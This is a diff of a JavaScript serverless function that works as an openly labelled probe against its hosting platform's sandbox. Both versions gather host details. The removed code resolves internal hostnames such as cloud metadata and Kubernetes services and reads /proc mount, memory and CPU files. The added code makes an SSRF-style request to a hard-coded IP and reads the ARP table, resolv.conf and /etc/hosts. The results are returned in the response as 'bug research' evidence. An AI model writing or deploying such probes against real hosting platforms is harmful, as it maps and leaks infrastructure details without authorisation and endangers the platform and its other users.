@@ -1,47 +1,54 @@
 const fs = require('fs');
-const dns = require('dns').promises;
+const http = require('http');
 
 exports.handler = async (event, context) => {
-  const disclosure = {};
+  const bugReport = {};
 
-  // 1. DNS Leak Test
-  try {
-    const internalHosts = [
-      'metadata.google.internal',
-      'kubernetes.default.svc',
-      'localhost',
-      'internal-api.netlify.com'
-    ];
-    disclosure.dns_lookup = {};
-    for (const host of internalHosts) {
-      try {
-        disclosure.dns_lookup[host] = await dns.lookup(host);
-      } catch (e) {
-        disclosure.dns_lookup[host] = "Not Found";
-      }
+  // --- PROBE 1: SSRF to Internal Netlify API ---
+  const checkInternal = (ip) => new Promise((resolve) => {
+    const req = http.get(`http://${ip}/`, { timeout: 2000 }, (res) => {
+      resolve({
+        status: res.statusCode,
+        headers: res.headers
+      });
+    });
+    req.on('error', (e) => resolve(`Failed: ${e.message}`));
+  });
+
+  bugReport.ssrf_test = await checkInternal('18.208.88.157');
+
+  // --- PROBE 2: Container Escape / Directory Traversal ---
+  const secretPaths = [
+    '/proc/net/arp',
+    '/etc/resolv.conf',
+    '/etc/hosts'
+  ];
+
+  bugReport.file_leak = {};
+  secretPaths.forEach(p => {
+    try {
+      bugReport.file_leak[p] = fs.readFileSync(p, 'utf8').substring(0, 200);
+    } catch (e) {
+      bugReport.file_leak[p] = `Denied: ${e.message}`;
     }
-  } catch (e) { disclosure.dns_error = e.message; }
+  });
 
-  // 2. Mount Points
+  // --- PROBE 3: ARP Table (Network Disclosure) ---
   try {
-    disclosure.mounts = fs.readFileSync('/proc/mounts', 'utf8').split('\n').filter(m => m.includes('/tmp') || m.includes('/var/task'));
-  } catch (e) { disclosure.mounts = e.message; }
+    bugReport.arp_table = fs.readFileSync('/proc/net/arp', 'utf8');
+  } catch (e) {
+    bugReport.arp_table = "Forbidden";
+  }
 
-  // 3. Checkk Limit Resource
-  try {
-    disclosure.mem_info = fs.readFileSync('/proc/meminfo', 'utf8').split('\n').slice(0, 5);
-    disclosure.cpu_info = fs.readFileSync('/proc/cpuinfo', 'utf8').split('\n').slice(0, 5);
-  } catch (e) { disclosure.specs_error = e.message; }
-
-  // 4. Data Injection
-  disclosure.raw_headers = event.headers;
+  console.log('--- BUG RESEARCH LOG ---');
+  console.log(JSON.stringify(bugReport, null, 2));
+  await new Promise(r => setTimeout(r, 500)); 
 
   return {
     statusCode: 200,
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      message: "Information Disclosure Probe",
-      results: disclosure
+    body: JSON.stringify({ 
+        research_status: "Complete", 
+        evidence: bugReport 
     }, null, 2)
   };
 };
